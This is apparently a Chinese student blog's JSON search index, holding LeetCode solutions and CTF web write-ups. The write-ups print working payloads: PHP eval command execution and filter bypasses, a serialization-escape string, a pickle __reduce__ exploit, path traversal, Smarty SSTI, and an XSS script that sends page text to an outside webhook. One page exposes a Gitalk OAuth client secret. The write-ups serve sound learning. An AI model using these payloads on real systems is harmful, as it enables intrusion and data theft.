{"pages":[{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"},{"title":"","text":"个人简介 分享很喜欢的老罗的一段话： “每一个生命来到世间都注定改变世界，别无选择。要么变得好一点，要么变得坏一点。你如果走进社会为了生存为了什么不要脸的理由，变成了一个恶心的成年人社会中的一员，那你就把这个世界变得恶心了一点点。如果你一生刚正不阿，如果你一生耿直，没有做任何恶心的事情，没做对别人有害的事情，一辈子拼了老命勉强把自己身边的几个人照顾好了，没有成名没有发财，没有成就伟大的事业，然后耿着脖子一生正直，到了七八十岁耿着脖子去世了。你这一生是不是没有改变世界？你还是改变世界了，你把这个世界变得美好了一点点。因为世界上又多了一个好人。“ 善恶终有报,天道好轮回。不信抬头看,苍天饶过谁。无论何时何地，我们都要保持一颗积极乐观、善良感恩的心。但行好事莫问前程，永远年轻，永远热内盈眶，永远保持正能量。💪💪💪💪💪💪冲鸭！！！！ -&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;个人信息：计算机科学与技术专业从事JAVA后端开发码畜一枚坚信代码改变世界 博客信息 网站采用的Icarus主题 追求尽可能的简洁，清晰，易用。 在Icarus主题之上进行了部分修改。 更新日志：–2020.09.20：icarus4.0适配–2020.01.18：icarus3.0适配–2019.11.17：增加深色主题开关–2019.10.30：去图，精简卡片–2019.10.22：改版部分显示，优化速度–2019.10.16：文章列表加上评论数显示–2019.10.13：改版评论–2019.09.25：图片、资源接入CDN免费jsDelivr、文章加入置顶–2019.09.19：开源博客代码–2019.09.19：修改布局，拉伸布局，更宽的展示–2019.09.18：修改友链ui为一行三个，并适配移动端，暗黑模式文章增加评论链接，增加留言链接–2019.09.14：增加精简next主题–2019.09.14：利用中秋节放假，重做了首页的热门推荐、加个widget最新评论框、归档页加入文章贡献概览面板 本站推荐索引 博客主题相关 github Issue 作为博客微型数据库的应用 github page网站cdn优化加速 博客源码分享 博客换肤的一种实现方式思路 博客中gitalk最新评论的获取 博客图片上传picgo工具github图传使用 安装、部分配置icarus主题中文版 技术知识点 Java并发知识点 法律法规 法律法规数据库 中华人民共和国国旗法 中华人民共和国宪法 中华人民共和国消费者权益保护法 中华人民共和国刑事诉讼法 中华人民共和国婚姻法 中华人名共和国网络安全法 中华人民共和国劳动法 其他 网易云音乐歌单分享 计划2020计划 2019.12.31 2020-GOALS 跑两三场马拉松 2019计划 2018.12.31/21:59:00-&gt;更新于2019.12.31 2019-GOALS 购买的专业书籍至少看完一遍（并发、重构、设计模式…）-&gt; 95% 额外： 追了很多剧 总结： 有优点有缺点，没坚持下来的还是太多，追了太多剧。以后多学习，多思考！ 时间轴记录","link":"/about/index.html"},{"title":"","text":"🎈🎈微笑墙🎈🎈 彭小苒 唐艺昕 李一桐 gakki 图片搜集于互联网，侵权请留言，马上处理😊。","link":"/album/index.html"},{"title":"","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： 网站图标：https://removeif.github.io/images/avatar.jpg 网站名称：辣椒の酱 网站地址：https://removeif.github.io 网站简介：后端开发，技术分享 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"}],"posts":[{"title":"1.basic_rce","text":"1.题目：123456&lt;?php//拿到flag就不要乱玩了哦~error_reporting(0);show_source(__FILE__);eval($_GET['a']);?&gt; 2.过程eval()将语句以PHP形式执行，其中语句需要符合PHP规范。可以利用eval()执行命令执行代码。 提交a=system(“”);执行系统命令，ls列出文件，cat、tac、more、less、tail、head命令读取文件。实践操作中发现其中一些读不出来，但查看网页源码时可以看见，如： 但是为什么呢…… tac、rev是可用的； 看到show_source(FILE)，试了一下，?a=show_source(“f111a9.php”);也可以出答案。 3.知识点 cat主要有三大功能：1.一次显示整个文件:cat filename 2.从键盘创建一个文件:cat &gt; filename 只能创建新文件,不能编辑已有文件.3.将几个文件合并为一个文件:cat file1 file2 &gt; file； tac反序输出文件的内容，文件的最后一行显示在第一行； more的功能是将文件从第一行开始，根据输出窗口的大小，适当的输出文件内容； less 可以随意浏览文件，解决more只能向后翻页的问题； head读取文件的前几行； tail读取文件的后几行； nl从第一行开始读取文件，并且显示行号； show_source() 函数对文件进行语法高亮显示，highlight_file()同样可行。 详细：https://www.cnblogs.com/machangwei-8/p/9570550.html","link":"/2020/11/24/1-basic-rce/"},{"title":"0CTF-2016-piapiapia","text":"[0CTF 2016]piapiapia进入网页发现是一个登录界面，尝试发现有register.php，登陆后有一个文件上传，有上传后的展示页面 御剑+dirmap扫，有访问控制，扫挺慢…… 御剑扫出来register页面，dirmap就扫出来了网页备份……害 下载网页源码： 本题测试发现admin账户是可以注册的，应该不存在获取管理员权限啥的……看一波profile 123456else { $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo'])); 这里有一个文件读取，上面是一个 反序列化，updata： 123456789101112$file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;'; 这里是序列化，将提交的信息进行了序列化，应该看一下user类里的有关方法： 12345678910public function update_profile($username, $new_profile) { $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = '$username'&quot;; return parent::update($this-&gt;table, 'profile', $new_profile, $where); } public function __tostring() { return __class__; } user有一个父类： 123456789101112131415class user extends mysql{...}//class mysql:public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); } public function __tostring() { return __class__; } 针对sql的一些查询语句进行了过滤，并会替换成hacker。 config文件里记录了有flag信息，但这里是空的……我们应该是要读这个文件，也就是是控制传输的反序列化。 上次的easy_serialize_php，文件对序列化后的字符串进行了检测的替换。无论是检测时字符串删除或增加，都可能导致反序列化的对象逃逸，这里不能控制键，所以是值逃逸。 反序列化的对象逃逸首先 要绕过nickname的长度限制，这里可以使用数组绕过 正常的反序列化： a:4:{s:5:”phone”;s:11:”11111111111”;s:5:”email”;s:7:”1@1.com“;s:8:”nickname”;a:1:{i:0;s:32:”1s:5:”photo”;s:10:”config.php”;}”;}s:5:”photo”;s:39:”upload/c4ca4238a0b923820dcc509a6f75849b”;} 数组的反序列化会在数据两边加上{}，所以我们要拼接&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}来覆写photo为我们想要的config文件。 注意到过滤中有一个where是5字符的，而hacker是6字符，这样的增加可以影响到前面对数组的描述，而我们的插入因为符合语法规则而从描述中逃逸。&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}有34个字符，如果我们在nickname中传入34个where，将会被替换成64个hacker。 ———————&gt; 本该解析的&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}被多出来的34个字符吞掉，后面正确闭合导致描述逃逸，photo被覆写为cofig.php： 成功上传： 解密： 1234567&lt;?php$config['hostname'] = '127.0.0.1';$config['username'] = 'root';$config['password'] = 'qwertyuiop';$config['database'] = 'challenges';$flag = 'flag{f46c2977-0f1c-48f5-ac44-01b966e6c53a}';?&gt; ok……","link":"/2021/04/02/0CTF-2016-piapiapia/"},{"title":"1.两数之和","text":"题目链接：https://leetcode-cn.com/problems/two-sum/ 开始回忆几乎快忘完的c语言知识，同时学java…… 1.思路双循环遍历数组； 看题解，指针没怎么学过，哈希就更不懂了，数据结构…… 2.注意事项return数组时，leetcode指定了returnSize分配return的有效内存，不赋值就return报错 3.代码1234567891011121314151617181920int* twoSum(int* nums, int numsSize, int target, int * returnSize){int i=0,j=0;static int c[2]={0};*returnSize = 2; for(i=0;i&lt;numsSize;i++){ for(j=i+1;j&lt;numsSize;j++) { if(nums[i]+nums[j]==target) { c[0] = i; c[1] = j; return &amp;c; break; } }} //printf(&quot;%d%d\\n&quot;, i,j); return NULL;} 一定有返回值，需要return，不然报错……","link":"/2020/11/20/1-%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"},{"title":"13.罗马数字转整数","text":"题目链接:https://leetcode-cn.com/problems/roman-to-integer/ 1.思路没啥高级的写法和优化，就单纯循环和判断……既然学了点PHP，就想用PHP写写试试。 2.注意事项就是要注意写$，一开始总是忘。PHP是一种弱类型的语言,它可以根据运行环境的变化而自动进行数据类型的转换，$s可直接以数组形式调用，str_split(string,length)函数也可以把字符串分割到数组中。 string是必选参数，length是可选，不选默认为一。 3.代码1234567891011121314151617class Solution { function romanToInt($s) {$arry=['I'=&gt;1,'V'=&gt;5,'X'=&gt;10,'L'=&gt;50,'C'=&gt;100,'D'=&gt;500,'M'=&gt;1000];$sum=0;for($i=0;$i&lt;strlen($s);$i++){ if($arry[$s[$i]]&lt;$arry[$s[$i+1]]){ $sum=$sum+$arry[$s[$i+1]]-$arry[$s[$i]]; $i++; } else{ $sum=$sum+$arry[$s[$i]]; }}return $sum; }} 害……","link":"/2020/11/25/13-%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97%E8%BD%AC%E6%95%B4%E6%95%B0/"},{"title":"11.29日一周学习记录","text":"11.29日一周学习记录 HTML在慕课网上找了HTML(5)+CSS(3)的入门课程，过了一下（尚未学完），用记事本简单记了一些知识点。 Html和css笔记 PHP也是在慕课网上找的入门课程，一天过完，尽管下了Wamp，然而教学并没有没有教…… 在LeetCode上用PHP做了道题： 罗马数字转整数 然后就是跟着题学学各种函数。 同样记录了笔记：PHP笔记 刚又看了一遍，关于异或的知识点我觉得有必要记录一下： 异或图解： 知乎上张英锋说的很好 异或其实就是找不同。 异或运算在自然中随处可见，对动物来说，异或能提供性命攸关的信息。 人们利用异或的运算特性，在重复数据中去除冗余信息，实现信息增量和数据压缩。 而在算法中，异或运算可以减少运算所使用的空间，减少复杂度 123 a = a^b； //a=10100111 b = b^a； //b=10100001 a = a^b； //a=00000110 123a=a+b;b=a-b;a=a-b; 异或是一种位运算，运算时把数字以二进制表示，对每一位0或1进行运算。 a b a⊕b 1 0 1 1 1 0 0 0 0 0 1 1 对于两个数字而言，即输入相同为0，不同则为1. 所以两数交换也可写为: 12a=a^b^a;b=a^b^b; 异或的运算法则： 归零律：a ⊕ a = 0 恒等律：a ⊕ 0 = a 交换律：a ⊕ b = b ⊕ a 结合律：a ⊕b ⊕ c = a ⊕ (b ⊕ c) = (a ⊕ b) ⊕ c; 自反：a ⊕ b ⊕ a = b. LeetCode关于异或的总结 啊吧啊吧…… WEB本周wp与知识点总结： basic_rce basic.rce.2 php变量覆盖 php变量覆盖.2 em，以后争取再多做点别的题……","link":"/2020/11/28/11-29%E6%97%A5%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"title":"2021ångstromCTF-Jar","text":"2021ångstromCTF-Jarhttps://2021.angstromctf.com/challenges 做了一道外国赛题…… 记得做ikun题的时候好像接触过jar(泡菜，python反序列化 不过ikun好难，回来再做做 12345678910111213141516171819202122232425262728293031323334from flask import Flask, send_file, request, make_response, redirectimport randomimport osapp = Flask(__name__)import pickleimport base64flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')@app.route('/pickle.jpg')def bg(): return send_file('pickle.jpg')@app.route('/')def jar(): contents = request.cookies.get('contents') if contents: items = pickle.loads(base64.b64decode(contents)) else: items = [] return '&lt;form method=&quot;post&quot; action=&quot;/add&quot; style=&quot;text-align: center; width: 100%&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;item&quot; placeholder=&quot;Item&quot;&gt;&lt;button&gt;Add Item&lt;/button&gt;&lt;img style=&quot;width: 100%; height: 100%&quot; src=&quot;/pickle.jpg&quot;&gt;' + \\ ''.join(f'&lt;div style=&quot;background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;&quot;&gt;{item}&lt;/div&gt;' for item in items)@app.route('/add', methods=['POST'])def add(): contents = request.cookies.get('contents') if contents: items = pickle.loads(base64.b64decode(contents)) else: items = [] items.append(request.form['item']) response = make_response(redirect('/')) response.set_cookie('contents', base64.b64encode(pickle.dumps(items))) return responseapp.run(threaded=True, host=&quot;0.0.0.0&quot;) 直接给出了源码，直接对对象进行了反序列化，而python中的反序列化是很危险的，利用__reduce__方法，可以在反序列化时使程序执行我们构造的代码： 上面：flag = os.environ.get(‘FLAG’, ‘actf{FAKE_FLAG}’) 甚至为我们构造好了语句…… 123456789101112import osimport pickleimport urllibimport base64class test(object): def __reduce__(self): return (eval, (&quot;os.environ.get('FLAG', 'actf{FAKE_FLAG}')&quot;,))c=pickle.dumps(test())d=base64.b64encode(c)print d 找到首尾相连的字母，获取flag……","link":"/2021/04/11/2021angstromCTF-Jar/"},{"title":"2.php变量覆盖","text":"1.题目123456789101112$flag='xxxxxxxx';extract($_GET);if(isset($liwu)) { $content=trim(file_get_contents($flag)); if($liwu==$content) { echo'flag{xxxxxxxxxxx}'; } else { echo 'please try other operation.'; }}?&gt; 2.过程该函数使用数组键名作为变量名，使用数组键值作为变量值。但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖漏洞。 $_GET 变量用于收集来自 method=”get” 的表单中的值，(array[键名] =&gt; 键值)。 但$flag显然是一串字符，不是正确的文件路径。处理结果似乎为空值； 查找知，trim(NULL)=空值；trim(空值)似乎也为空值： 所以要求liwu等于空值，?liwu即可。 默认为空值 flag{s0metimes^its-useful}； 3.知识点 extract()：从数组中将变量导入到当前的符号表该函数使用数组键名作为变量名，使用数组键值作为变量值。会将已有变量覆盖； isset()检测变量是否已设置并且非NULL； file_get_contents：根据文件路劲去读取文件内容，若路径错误则返回值为空； trim():移除字符串两侧的字符,","link":"/2020/11/26/2-php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"title":"4.php变量覆盖.2","text":"1.题目1234567891011121314151617181920212223242526&lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;$_403 = &quot;拒绝访问&quot;;$_200 = &quot;欢迎~~~&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;) die(&quot;sssssssspost…&quot;);if ( !isset($_POST[&quot;flag&quot;]) ) die($_403);foreach ($_GET as $key =&gt; $value) $$key = $$value;foreach ($_POST as $key =&gt; $value) $$key = $value;if ( $_POST[&quot;flag&quot;] !== $flag ) die($_403);echo &quot;This is your flag : &quot;. $flag . &quot;\\n&quot;;die($_200);?&gt; 2.过程要求以POST方式访问，且要有flag输入……那最后打出的不就是我给的值？ 第一个foreach遍历get提参，以键名、键值为变量名 第二个foreach遍历post提参，以键名为变量名，键值为变量值。 一开始想让$flag=$flag啥的，结果flag一定是会改变的……开始想有没有什么操作能让flag值不变 确实没想到利用_200&amp;_403……害 3.知识点em，就是感觉思路开阔了 感受到自己的菜了……","link":"/2020/11/27/4-php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-2/"},{"title":"2021angstromCTF-nomnomnom","text":"2021angstromCTF-nomnomnomhttps://2021.angstromctf.com/challenges 一个小游戏，会记录分数，会在一个页面生成你的分数，记录展示用户名和分数 其中用户名这部分是可以控制的，产生了xss漏洞： 这里注入了标签：&lt;marquee&gt;&lt;/marquee&gt;，对页面产生了影响 123456789101112131415161718192021222324252627return res.send(`&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv='Content-Security-Policy' content=&quot;script-src 'nonce-${nonce}'&quot;&gt; &lt;title&gt;snek nomnomnom&lt;/title&gt; &lt;/head&gt; &lt;body&gt; ${extra}${extra ? '&lt;br /&gt;&lt;br /&gt;' : ''} &lt;h2&gt;snek goes &lt;em&gt;nomnomnom&lt;/em&gt;&lt;/h2&gt;&lt;br /&gt; Check out this score of ${score}! &lt;br /&gt; &lt;a href='/'&gt;Play!&lt;/a&gt; &lt;button id='reporter'&gt;Report.&lt;/button&gt; &lt;br /&gt; &lt;br /&gt; This score was set by ${name} &lt;script nonce='${nonce}'&gt;function report() { fetch('/report/${req.params.shareName}', { method: 'POST' });}document.getElementById('reporter').onclick = () =&gt; { report() }; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;`);}); 这是源码部分，采取了**CSP (Content Security Policy)**来防止xss注入，为了绕过csp，这里需要用到： Dangling Markuphttps://blog.csdn.net/angry_program/article/details/106441323 html在读取标签时，&lt;会一直匹配到下一个&gt;为止，利用这个特性，我们可以使注入点下的nonce属性成为我们脚本标签中的属性从而绕过csp，不过此漏洞似乎有版本限制……。 payload： 1&lt;script src=&quot;data:text/javascript, fetch('webhookurl', {method: 'POST', mode: 'no-cors', body: document.body.innerText})&quot; 这里用到https://webhook.site/提供的xss平台，让网页加载脚本时去访问网页即可 不过大佬好像还进行了一步： 12345function report() { fetch('/report/f8f9270fe102e65a', { method: 'POST' })} js……不是很会，在学了在学了 大概是通过fetch再次请求资源……？ 我去找了源码，结果是用Node.js的Express框架写的…… /report路由是post方法，只有几步处理…… 看得不是很懂，让我学一波相关语言再审计吧…… xss平台： 赋值了cookie，源码中有检测cookie的操作，这可能就是为什么要在这个页面请求两次？ webhook： 第一次： 第二次： 响应信息里出现了flag！ 以后学习一些知识再回来完善完善……","link":"/2021/04/11/2021angstromCTF-nomnomnom/"},{"title":"5.HCTF-2018-WarmUp","text":"题目地址：https://buuoj.cn/challenges解题过程：网页上打开就只有一个大滑稽，网页名是Document，所以是文件包含？提交file参数，一直是：you can’t see it。 题目标签是代码审计，我也没看到代码啊…… 查看源代码看到source.php内心毫无波澜，后来查找才知道要访问它……（菜\\1）* 好，访问source.php我终于看到代码了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can't see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can't see it&quot;; return false; } } if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; 到目前为止还没有看到过这么长的代码审计（菜\\2）* 先看与file有关的代码： 123456if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; file要求是字符串且不为空，用emmm中的checkFile调用。file中的值传递给了page。checkFile中四个if语句，每个都有return。 第一个if：12345$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can't see it&quot;; return false; } 先设置了一个白名单数组，准许访问source.php和hint.php，hint.php中存放了flag的位置。第一个if语句要求page存在且为字符串，不符合则return false，退出程序。 第二个if：123if (in_array($page, $whitelist)) { return true; } in_array()函数在page中查找是否有与whitelist中键值对应的字符串。有则return true，退出程序。 第三个if：12345678$_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } mb_strpos为page拼接了一个？，并返回其**第一次出现的位置**。mb_substr从开头显示字符至？所在的位置，处理后page再次进行比对。 那不是只能读source.php了？……$_page啊，那没事了……（菜\\3）* 第四个if：1234567891011$_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can't see it&quot;; return false; 先对page进行了url编码，再进行读取和对比的操作…… 注意：PHP中$_GET、$_POST、$_REQUEST这类函数在提取参数值时会URL解码一次 这位师傅上面写第三个if不能利用，但逻辑理通之后我感觉也是可以利用的。 ?一次编码为%3F，二次编码为%253F，那么第三个if的利用需要if的一次编码。 第三个if利用：payload：?file=source.php%3F../../../../../../ffffllllaaaagggg（服务器找不到source.php%3F，就视为一个文件夹） 成功出flag 第四个if利用：自然，需要二次编码的’?‘。 payload：?file=source.php%253F../../../../../../ffffllllaaaagggg 总算做了点实在事…… 知识点总结： 这位师傅不错呦 in_array() 函数搜索数组中是否存在指定的值 mb_substr() 函数返回字符串的一部分， substr() 函数只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。 mb_strpos() 查找字符串在另一个字符串中首次出现的位置，mb_strpos 按字处理，strpos 按字符处理。 补充：https://www.feiniaomy.com/post/388.html 关于路径符号的一些知识。 服务器找不到XXXXXXX，就视为一个文件夹。","link":"/2020/12/01/5-HCTF-2018-WarmUp/"},{"title":"3.basic.rce.2","text":"1.题目1234567891011121314&lt;?php//flag in flagerror_reporting(0);show_source(__FILE__);if (isset($_GET['Rem'])){ $Ram=$_GET['Rem']; if(preg_match(&quot;/(more|less|flag|head|nl|tail|tac|cat|rm|cp|mv|\\*|\\{)/i&quot;, $Ram)){ die(&quot;&lt;strong&gt;&lt;center&gt;总之就是非常可爱&lt;/center&gt;&lt;/strong&gt;&quot;); } $a = eval($Ram);}else{ echo &quot;&lt;script&gt;alert('爬爬爬我最会爬了')&lt;/script&gt;&quot;;} 2.过程&amp;知识点preg_match函数会对字符串进行正则匹配。 https://www.php.net/manual/zh/function.preg-match.php（有点多，慢慢学吧） 正则匹配： https://www.runoob.com/regexp/regexp-syntax.html 同时我查到了shell中使用的glob通配符 https://blog.csdn.net/qq_28189423/article/details/83720955 补充：https://blog.51cto.com/14812296/2507411?source=dra 对于cat被过滤： 以下都可以作为替代： more:一页一页的显示档案内容 less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容（不是很懂，读出来很奇怪） sort:可以查看 uniq:可以查看 file -f:报错出具体内容 rev：逆向输出 绕过： ca$1t:未定义变量默认空值 ca‘’t ：‘’空值 ‘c”a”t ????’或”c’a’t fl[a]g” ca``t 似乎还有base64编码和拼接的高阶操作……：http://blog.leanote.com/post/bowu/de8babf67fd8 好像还有别的执行方式 ?Rem=?&gt;&lt;?=`ls`; 其实直接?Rem=echo%20`ls`;就行…… 先结束上面的语句，&lt;?=是echo的快捷用法，输出了`ls`,反引号括出命令执行的语句 &lt;?=可以被禁用，是不是有点……鸡肋 大佬博客： 无字母数字webshell： https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html https://www.gem-love.com/websecurity/1407.html#PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C ctfshow……","link":"/2020/11/27/3-basic-rce-2/"},{"title":"9.回文数","text":"题目链接：https://leetcode-cn.com/problems/palindrome-number/ 1.思路刚刚做完整数反转，回文数好像也差不多，负数一定不是回文数；整数反转以后等于其本身为回文数。 2.注意事项题目要求一定要有返回值，return NULL。 3.代码12345678910111213141516171819202122232425bool isPalindrome(long long int x){int zf=1;//int x；//scanf(&quot;%d&quot;,&amp;x);if(x&gt;0) zf=1;if(x&lt;0) {return false;}int w=x,i=0,h=x;while(w){ w/=10; i++;}int sz[i+1],t=0;long long int s=0;for(int j=i;j&gt;0;j--) { sz[j]=h%10; h=h/10; t=pow(10,j-1); s=s+sz[j]*pow(10,j-1); }if(x==s) {return true;} //printf(&quot;%lld&quot;,s);return NULL;} 是不是摸鱼了……","link":"/2020/11/22/9-%E5%9B%9E%E6%96%87%E6%95%B0/"},{"title":"7.整数反转","text":"题目链接：https://leetcode-cn.com/problems/reverse-integer 1.思路 记得曾经在洛谷做过，回去翻了下，自己定义了个10000000长度的数组…… 先记录数组长度，根据数组长度定义数组，记录各个数对应的位数，再分别乘以10的次方实现反转 2.注意事项​ 1.先回忆了32位的有符号数的概念(有关原码、反码、补码)； ​ 2.在给s赋值时，9*10^10赋值出错，单int是不行的： ​ 整型变量int占4个字节，32位，取值范围是-2^31 - 2^31-1 ,也就是（-2147483648） - (2147483647)，若溢出则会循环取值， ​ 也就是2147483648溢出后回到了最小负整数-2147483648，2147483649溢出后变成了-2147483648+1=-2147483647； 详细参考：https://zhuanlan.zhihu.com/p/98674721 而对x取绝对值时，给定数据超过了限制，即int x ，改成long long int 从根源上解决问题 ​ 3.再学习学习abs(),pow(),sizeof()…… 3.代码1234567891011121314151617181920212223242526int reverse(long long int x){int zf=1;//int x；//scanf(&quot;%d&quot;,&amp;x);if(x&gt;0) zf=1;if(x&lt;0) {x=(-1)*x;zf=0;}int w=x,i=0,h=x;while(w){ w/=10; i++;}int sz[i+1],t=0;long long int s=0;for(int j=i;j&gt;0;j--) { sz[j]=h%10; h=h/10; t=pow(10,j-1); s=s+sz[j]*pow(10,j-1); }if(zf==0) s=-s; //printf(&quot;%lld&quot;,s);if(s&gt;pow(2,31)-1 || s&lt;(-1)*pow(2,31)) return 0;else return s;} ​","link":"/2020/11/21/7-%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/"},{"title":"ACTF2020-新生赛-BackupFile","text":"[ACTF2020 新生赛]BackupFile1.题目：2.过程：页面提示网页有备份文件，备份文件会导致源码的泄露。 这道题的备份是 index.php.bak dalao总结： CTFHub-web(备份文件下载) ctf/web源码泄露及利用办法【总结中】 下载源码后是一段代码： 这里有一个intval函数：返回对象的整数值 确实有一些特性……但下面的比较是弱比较，字符串被转化为整型，令key=123即可。","link":"/2021/02/16/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile/"},{"title":"ACTF2020-新生赛-Upload","text":"[ACTF2020 新生赛]Upload1.题目：2.过程：文件上传题目，试试老套路： burpsuit并没有抓到包……应该是前端就做了过滤 发现js里做了过滤，那就修改js再上传： 上传成功，连接网站： 绕过js之后bp再修改应该也行……","link":"/2021/02/15/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/"},{"title":"ASIS-2019-Unicorn-shop","text":"[ASIS 2019]Unicorn shop1.题目：2.过程：题目要我们购买独角兽，实际上只有第四种可以购买…… 只可以输入一个字符，如果不填入内容提交，网页会发生报错： numeric： 语法：unicodedata.numeric(chr[, default]) 描述：将Unicode字符(chr)转换为等效的数值。以浮点形式返回【与chr相对应的数值】。若未定义这样的值，则返回默认值default；若未指定默认值，则抛出ValueError异常。（把一个表示数字的字符转换为浮点数。比如，可将’5’、’五’转换数值输出。与digit()不同是numeric()可以转换任意表示数值的字符，不仅仅限于0到9的字符） 不同的Unicode字符可以对应不同的数值，可以在https://www.compart.com/en/unicode查询： 官方wp：https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis dalao：https://gality.cn/?p=123#%E7%AD%89%E4%BB%B7%E5%BD%A2%E5%BC%8F ……","link":"/2021/02/24/ASIS-2019-Unicorn-shop/"},{"title":"BJDCTF2020-The-mystery-of-ip","text":"[BJDCTF2020]The mystery of ip1.题目：模板注入2.过程：打开是一个页面，有flag和hint页面： flag页面：显示了我的ip hint： 大概率是XFF头吧…… 确实IP更改了…查找资料： 使用smarty模板，且有用户可控的不加过滤的值，此时根据smarty的规则注入实现代码的执行： {exec(“cat /flag”)} {system(“cat /flag”)} {if system(“cat /flag”)}{if} 都可以 PHP的模板注入（Smarty模板CSDN） Smarty SSTI 有人提交的一个smarty漏洞 这个题是我走私者没思路的是写的，万万没想到接触了新的东西……还有很多人喷smarty","link":"/2021/02/05/BJDCTF2020-The-mystery-of-ip/"},{"title":"BJDCTF2020-Easy-MD5","text":"[BJDCTF2020]Easy MD51.题目：MD5绕过2.过程LazyDogR4U和Post to 